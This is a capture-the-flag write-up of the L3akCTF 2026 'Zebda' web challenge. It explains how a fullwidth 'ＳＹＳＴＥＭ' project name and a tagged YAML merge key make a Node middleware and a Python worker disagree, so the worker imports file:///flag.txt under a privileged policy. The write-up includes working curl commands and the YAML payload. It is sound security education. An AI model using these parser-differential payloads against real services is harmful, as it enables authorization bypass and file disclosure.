---
title: "Zebda — when two YAML parsers disagree about a privileged job"
ctf: "L3akCTF 2026"
date: 2026-08-01
category: "CTF · Web Security"
tags: ["web", "yaml", "parser-differential", "unicode", "policy-confusion", "ssrf"]
excerpt: "A fullwidth project name bypasses a JavaScript reservation check, then a YAML merge is interpreted differently by the middleware and the Python worker. The worker ends up importing /flag.txt under the system policy."
---

I liked `Zebda` because the exploit is not one dramatic bug. It is two small disagreements in a request path: a Node.js middleware layer checks the job, then a Python worker parses it again and performs it.

The trick is to make those two services disagree twice:

1. Unicode normalization makes a project name look harmless to JavaScript but privileged to Python.
2. `js-yaml` and PyYAML interpret the same YAML merge differently.

The challenge is archived in the official [L3akCTF 2026 challenge repository](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/L3akCTF/2026/web/Zebda). I used its Docker bundle to check the parser differential locally; the local `flag.txt` is a fixture, not the competition flag.

## Contents

- [The two trust decisions](#the-two-trust-decisions)
- [Bypassing the reserved project name](#bypassing-the-reserved-project-name)
- [Making the YAML parsers disagree](#making-the-yaml-parsers-disagree)
- [Executing the privileged import](#executing-the-privileged-import)
- [Solver / reproduction](#solver--reproduction)
- [Result](#result)

## The two trust decisions

The middleware checks the project slug and the manifest action. The worker later canonicalizes the slug, selects a policy, parses the same manifest again, and executes it.

In plain terms, a string can look harmless to the first parser and become privileged when the second parser normalizes or merges it differently.

The security boundary is therefore not “the YAML parser” in isolation. It is the hand-off between middleware and worker. The middleware makes an authorization decision and forwards the original text; the worker makes a second authorization decision from that text. Any transformation that happens between those decisions is part of the attack surface.

## Bypassing the reserved project name

The Node.js middleware blocks the literal names `system` and `admin`:

```javascript
const reservedNames = new Set(['system', 'admin']);

function isReservedProjectName(slug) {
  return reservedNames.has(slug.toLowerCase());
}
```

The Python worker uses Unicode normalization and case folding instead:

```python
def canonicalize_slug(raw_slug):
    return unicodedata.normalize("NFKC", raw_slug).casefold()

def select_policy(raw_slug):
    if canonicalize_slug(raw_slug) == "system":
        return "system"
    return "standard"
```

The fullwidth string `ＳＹＳＴＥＭ` is not equal to the literal ASCII string during the middleware check. NFKC normalization converts it to `system` in the worker, so the project receives the privileged policy.

NFKC is compatibility normalization: it deliberately maps presentation variants such as fullwidth Latin characters to their ordinary compatibility forms. JavaScript's `toLowerCase()` does not perform that compatibility fold, so the first check compares a different string from the one used by `canonicalize_slug()`. The bypass is not “Unicode is weird” in the abstract; it is two concrete canonicalization functions applied at different trust boundaries.

```bash
BASE='https://zebda.instances.ctf.l3ak.team'

curl -sk -X POST "$BASE/api/projects" \
  -H 'Content-Type: application/json' \
  --data '{"slug":"ＳＹＳＴＥＭ"}'
```

Save the returned project ID for the build request.

## Making the YAML parsers disagree

The middleware parses the manifest with Node's `js-yaml` and permits only a `translate` action:

```javascript
if (manifest.job.action !== 'translate') {
  throw new Error('Unsupported action');
}
```

The worker parses the raw YAML with PyYAML:

```python
manifest = yaml.safe_load(raw_manifest)
```

The manifest uses an ordinary-looking merge and an explicitly tagged merge key:

```yaml
a: &a {action: translate, source: https://example.com}
b: &b {action: import, source: file:///flag.txt}
job:
  <<: *a
  ? !!merge '<<'
  : *b
```

The middleware treats the tagged property as an ordinary property and sees the safe value:

```json
{
  "job": {
    "action": "translate",
    "source": "https://example.com"
  }
}
```

PyYAML treats `!!merge '<<'` as a merge directive. The worker therefore receives an effective job of:

```python
{
    "action": "import",
    "source": "file:///flag.txt"
}
```

The project has already been normalized to the `system` policy, so the worker permits the import.

The ordering is important. The safe mapping `*a` appears first, so a shallow inspection of the YAML or the middleware's parsed object shows `action: translate`. PyYAML then recognizes the explicitly tagged `<<` key and applies the second mapping as a merge. The worker's final dictionary is not the same object that the middleware checked:

```text
middleware: job.action == "translate"
worker:     job.action == "import"
```

This is a policy-confusion bug rather than a YAML-only bug. If both services used the same parser and the same canonical representation, the action mismatch would disappear.

## Executing the privileged import

```bash
PROJECT_ID='PUT_THE_RETURNED_PROJECT_ID_HERE'

MANIFEST=$(printf '%s\n' \
  'a: &a {action: translate, source: https://example.com}' \
  'b: &b {action: import, source: file:///flag.txt}' \
  'job:' \
  '  <<: *a' \
  "  ? !!merge '<<'" \
  '  : *b')

curl -sk -X POST \
  "$BASE/api/projects/$PROJECT_ID/builds" \
  -H 'Content-Type: text/yaml' \
  --data-binary "$MANIFEST"
```

The worker reads the local flag and returns it in the build response.

The file URL is useful because the worker's privileged import action already has a file-reading primitive. There is no need to turn this into SSRF or command execution; the exploit only needs the worker to accept `import` under the system policy and return the produced artifact.

## Solver / reproduction

The complete standalone solver is [`solve.py`](/solvers/zebda/solve.py). It uses only Python's standard library and creates the project before submitting the YAML manifest, so there is no project ID to fill in by hand:

```bash
python3 solve.py http://127.0.0.1/
```

For an authorized HTTPS instance:

```bash
python3 solve.py https://zebda.instances.ctf.l3ak.team
```

When I run the Docker bundle locally, it returns `L3AK{local_placeholder_flag}`. That is only the fixture value; the flag below is the one from my original solve notes.

## Result

```text
L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}
```

The failure comes from two layers making different decisions about the same bytes. One layer checks the raw project name and merged YAML; the other normalizes and merges them differently before selecting the privileged action.
